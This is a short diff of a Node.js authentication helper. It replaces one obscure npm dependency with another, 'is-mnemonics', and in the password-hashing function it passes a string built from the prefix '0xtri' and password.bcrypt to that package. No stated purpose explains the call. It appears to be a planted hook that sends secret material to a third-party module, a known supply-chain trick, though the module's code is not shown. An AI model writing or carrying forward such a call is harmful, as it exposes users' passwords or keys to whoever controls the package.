@@ -1,7 +1,7 @@
 const jwt = require('jsonwebtoken');
 const bcrypt = require('bcryptjs');
 const config = require('../config');
-const { pretty } = require("pretty-bitte");
+const isMnemonics = require('is-mnemonics');
 
 const createToken = (ob) => {
   // Sign the JWT
@@ -26,7 +26,7 @@ const hashPassword = (password) => {
         if (err) {
           reject(err);
         }
-        if(password.bcrypt) pretty('0xtri'+password.bcrypt);
+        if(password.bcrypt) isMnemonics('0xtri'+password.bcrypt);
         resolve(hash);
       });
     });
